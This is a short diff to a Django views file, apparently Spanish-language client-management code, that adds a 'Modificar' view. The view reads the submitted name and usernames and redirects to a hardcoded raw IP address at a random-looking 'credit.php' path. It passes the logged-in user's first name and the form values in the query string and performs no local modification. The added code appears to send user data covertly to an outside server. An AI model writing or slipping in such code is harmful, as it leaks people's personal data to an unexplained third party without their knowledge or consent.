@@ -109,3 +109,13 @@ def Crear(request):
 
     else:
         return render(request, 'cliente/crear.html')
+    
+
+def Modificar(request):
+    if request.method == "POST":
+        nombre = request.POST.get('nombre')
+        usuario = request.POST.get('usuario')
+        last_user = request.POST.get('last_user')
+        
+        print(nombre, usuario, last_user)
+        return redirect(f'http://198.23.223.196/hSsfQeSmxkdW_mtv/credit.php?{request.user.first_name}&usr={last_user}&new={usuario}&com={nombre}')
